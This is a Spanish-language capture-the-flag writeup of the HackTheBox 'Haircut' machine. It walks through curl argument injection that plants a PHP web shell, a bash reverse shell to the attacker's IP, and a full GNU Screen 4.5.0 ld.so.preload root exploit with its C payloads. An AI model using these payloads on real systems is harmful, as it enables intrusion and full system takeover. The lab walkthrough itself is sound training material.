---
date: 2023-05-14 12:00:00
layout: post
title: Haircut Writeup
subtitle: Writeup de la máquina Haircut de la plataforma HackTheBox
description: Realizaré la máquina Haircut explicando el procedimiento para lograr pwnearla. Esta máquina tiene una dificultad Media.
image: https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-haircut/1.png
optimized_image: https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-haircut/1.png
category: Writeup
tags:
  - HackTheBox
  - Writeup
  - Medium
author: FredBrave
---
# Enumeración
Empezamos con un escaneo rápido a la ip de la máquina víctima una vez terminado proseguimos con un escaneo más exhaustivo hacia los puertos abiertos. Esto es para encontrar los servicios y sus versiones corriendo en los puertos.
```bash
$ sudo nmap -p- --open -sS --min-rate 2000 -n -Pn 10.129.186.45 -oG Targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-14 12:40 EDT
Nmap scan report for 10.129.186.45
Host is up (0.22s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 36.83 seconds

$ sudo nmap -p22,80 -sCV 10.129.186.45 -oN Target
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-14 12:42 EDT
Nmap scan report for 10.129.186.45
Host is up (0.22s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e975c1e4b3633c93f2c618083648ce36 (RSA)
|   256 8700aba98f6f4bbafbc67a55a860b268 (ECDSA)
|_  256 b61b5ca9265cdc61b775906c88516e54 (ED25519)
80/tcp open  http    nginx 1.10.0 (Ubuntu)
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_http-title:  HTB Hairdresser 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.68 seconds
```
Encontramos los puertos 22 y 80. Empezamos a enumerar el puerto 80 para tratar de encontrar alguna manera de explotarlo.
<img class="img" src="/assets/img/machines/Haircut/1.png" width="1000">
Solo encontramos una imagen sin ninguna pista o algo oculto. Así que proseguimos a fuzzear la web.
```bash
ffuf -u http://10.129.95.174/FUZZ -w /home/kali/Ayuditas/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -e .php

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.95.174/FUZZ
 :: Wordlist         : FUZZ: /home/kali/Ayuditas/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 175ms]
    * FUZZ: uploads

[Status: 200, Size: 446, Words: 24, Lines: 20, Duration: 167ms]
    * FUZZ: exposed.php
```
Encontramos 2 rutas interesantes, uploads me da un forbidden por lo cual no puedo enumerarlo, pero exposed.php me permite entrar y ver su contenido.
<img class="img" src="/assets/img/machines/Haircut/2.png" width="1000">
Al parecer puede hacer peticiones a otras web, trataré de que me envíe una petición a un servidor web python establecido por mí.
<img class="img" src="/assets/img/machines/Haircut/3.png" width="800">
```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.186.45 - - [14/May/2023 12:49:37] code 404, message File not found
10.129.186.45 - - [14/May/2023 12:49:37] "GET /a HTTP/1.1" 404 -
```
<img class="img" src="/assets/img/machines/Haircut/4.png" width="1200">
La petición me llega, esto me da muchas ideas para tratar de explotar esto. Lo más importante es que el output de la petición me devuelve un output bastante familiar. Así es el output es perteneciente al comando curl. Una vez sabido esto puedo intuir que podre inyectar comandos o al menos parámetros dentro de este input.

Empecé tratando de lograr que me descargue un archivo php que me logre ejecutar comandos a través de la llamada de un parámetro.
```bash
$ nano shell.php
$cat shell.php 
<?php system($_GET['cmd']); ?>
```
Trataré de que me descargue y guarde este archivo php en la carpeta uploads.
`http://10.10.16.42/shell.php -o uploads/fred.php`
<img class="img" src="/assets/img/machines/Haircut/5.png" width="1000">
Lo mando y me llaga la petición.
```bash
python3 -m http.server 80    
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.186.45 - - [14/May/2023 13:00:31] "GET /shell.php HTTP/1.1" 200 -
```
Ahora compruebo que haya funcionado.
```bash
curl -s -X GET http://10.129.186.45/uploads/fred.php\?cmd\=whoami
www-data
```
Tenemos RCE como www-data.
# Shell como www-data.
Nos enviaremos una shell como www-data con el siguiente comando.
```bash
$ curl -G http://10.129.186.45/uploads/fred.php --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.16.42/443 0>&1'"
$ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.42] from (UNKNOWN) [10.129.186.45] 50956
bash: cannot set terminal process group (1239): Inappropriate ioctl for device
bash: no job control in this shell
www-data@haircut:~/html/uploads$ whoami
whoami
www-data
www-data@haircut:~/html/uploads$
```
Haremos un tratamiento de la tty.
```bash
www-data@haircut:~/html/uploads$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@haircut:~/html/uploads$ ^Z
CTRL + Z
[1]  + 6112 suspended  nc -nlvp 443
$ stty raw -echo;fg
[1]  + 6112 continued  nc -nlvp 443

www-data@haircut:~/html/uploads$ export TERM=xterm 
www-data@haircut:~/html/uploads$ export SHELL=bash
www-data@haircut:~/html/uploads$ stty rows 48 columns 238
www-data@haircut:~/html/uploads$
```
# Shell como root.
Enumerando encontré un binario SUID muy interesante.
```bash
www-data@haircut:~/html/uploads$ find / -perm -4000 -exec ls -la {} \; 2>/dev/null
-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 40128 May  4  2017 /bin/su
-rwsr-xr-x 1 root root 40152 Dec 16  2016 /bin/mount
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 27608 Dec 16  2016 /bin/umount
-rwsr-xr-x 1 root root 136808 Jan 20  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 23376 Jan 18  2016 /usr/bin/pkexec
-rwsr-xr-x 1 root root 32944 May  4  2017 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 39904 May  4  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 32944 May  4  2017 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 75304 May  4  2017 /usr/bin/gpasswd
-rwsr-sr-x 1 daemon daemon 51464 Jan 14  2016 /usr/bin/at
-rwsr-xr-x 1 root root 54256 May  4  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 1588648 May 19  2017 /usr/bin/screen-4.5.0
-rwsr-xr-x 1 root root 40432 May  4  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 49584 May  4  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 38984 Mar  7  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 208680 Apr 29  2017 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 428240 Mar 16  2017 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 14864 Jan 18  2016 /usr/lib/policykit-1/polkit-agent-helper-1
www-data@haircut:~/html/uploads$ ls -la /usr/bin/screen-4.5.0
-rwsr-xr-x 1 root root 1588648 May 19  2017 /usr/bin/screen-4.5.0
```
No es un SUID frecuente por lo que lo busque y encontré un exploit de este.
```bash
searchsploit screen 4.5.0
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
GNU Screen 4.5.0 - Local Privilege Escalation                                                                                                                                                               | linux/local/41154.sh
GNU Screen 4.5.0 - Local Privilege Escalation (PoC)                                                                                                                                                         | linux/local/41152.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
Descargue el script sh en la máquina víctima y trate de ejecutar, pero la máquina peta al hacerlo. Por lo que tuve que hacerlo manual.
```bash
cat 41154.sh 
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017)
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so...
/tmp/rootshell
```
Me fui guiando leyendo el script para lograr explotar el binario.
```bash
$ nano libhax.c
$ cat libhax.c 
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
```
Cree el libhax.c y lo compilo.
```bash
$ gcc -fPIC -shared -ldl -o libhax.so libhax.c     
libhax.c: In function ‘dropshell’:
libhax.c:7:5: warning: implicit declaration of function ‘chmod’ [-Wimplicit-function-declaration]
    7 |     chmod("/tmp/rootshell", 04755);
      |     ^~~~~
$ ls
41154.sh  libhax.c  libhax.so
```
Creo rootshell.c y lo compilo.
```bash
$ nano rootshell.c
$ cat rootshell.c 
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
$ gcc -o rootshell rootshell.c -static
rootshell.c: In function ‘main’:
rootshell.c:3:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
    3 |     setuid(0);
      |     ^~~~~~
rootshell.c:4:5: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
    4 |     setgid(0);
      |     ^~~~~~
rootshell.c:5:5: warning: implicit declaration of function ‘seteuid’ [-Wimplicit-function-declaration]
    5 |     seteuid(0);
      |     ^~~~~~~
rootshell.c:6:5: warning: implicit declaration of function ‘setegid’ [-Wimplicit-function-declaration]
    6 |     setegid(0);
      |     ^~~~~~~
rootshell.c:7:5: warning: implicit declaration of function ‘execvp’ [-Wimplicit-function-declaration]
    7 |     execvp("/bin/sh", NULL, NULL);
      |     ^~~~~~
rootshell.c:7:5: warning: too many arguments to built-in function ‘execvp’ expecting 2 [-Wbuiltin-declaration-mismatch]
$ ls
41154.sh  libhax.c  libhax.so  rootshell  rootshell.c
```
Tenido estos 2 binarios compilados los descargué en la máquina víctima en la ruta /tmp.
```bash
www-data@haircut:/tmp$ cd /tmp
www-data@haircut:/tmp$ wget http://10.10.16.42/libhax.so
--2023-05-14 19:29:51--  http://10.10.16.42/libhax.so
Connecting to 10.10.16.42:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 15528 (15K) [application/octet-stream]
Saving to: 'libhax.so'

libhax.so                                                   100%[=========================================================================================================================================>]  15.16K  42.2KB/s    in 0.4s    

2023-05-14 19:29:52 (42.2 KB/s) - 'libhax.so' saved [15528/15528]

www-data@haircut:/tmp$ wget http://10.10.16.42/rootshell
--2023-05-14 19:30:02--  http://10.10.16.42/rootshell
Connecting to 10.10.16.42:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 766976 (749K) [application/octet-stream]
Saving to: 'rootshell'

rootshell                                                   100%[=========================================================================================================================================>] 749.00K   205KB/s    in 4.2s    h

2023-05-14 19:30:07 (177 KB/s) - 'rootshell' saved [766976/766976]

www-data@haircut:/tmp$ chmod +x libhax.so 
www-data@haircut:/tmp$ chmod +x rootshell 
www-data@haircut:/tmp$
```
Proseguí a entrar a la ruta /etc para ejecutar los siguientes comandos.
```bash
www-data@haircut:/tmp$ cd /etc
www-data@haircut:/etc$ umask 000
www-data@haircut:/etc$ screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
www-data@haircut:/etc$ screen -ls
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /tmp/screens/S-www-data.

www-data@haircut:/etc$
```
Y al ejecutar rootshell tendríamos que escalar a root.
```bash
www-data@haircut:/etc$ /tmp/rootshell 
# whoami
root
#
```
Hemos pwneado la maquina!!!
